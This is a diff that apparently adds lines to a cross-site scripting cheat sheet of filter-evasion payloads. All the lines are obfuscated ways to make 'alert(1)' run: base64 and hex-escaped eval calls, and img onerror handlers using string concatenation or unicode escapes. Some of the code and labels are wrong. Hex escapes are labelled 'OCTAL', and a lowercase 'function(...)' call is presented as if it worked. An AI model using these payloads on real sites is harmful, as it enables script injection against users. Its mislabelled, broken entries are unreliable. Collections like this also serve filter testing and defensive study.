@@ -26,4 +26,10 @@ eval(atob("YWxlcnQoMSk=")) # // → runs alert(1) (BASE64)
 
 eval("\x61\x6c\x65\x72\x74(1)");  #// Hex for "alert(1)" # OCTAL
 
+function("\x61\x6c\x65\x72\x74(1)"); OCTAL
+
+<img src=1 onerror="var a='al',b='ert(1)';eval(a.concat(b))"> #String concatenation
+
+<img src=1 onerror="al\u0065rt(1)"> # Unicode
+
 
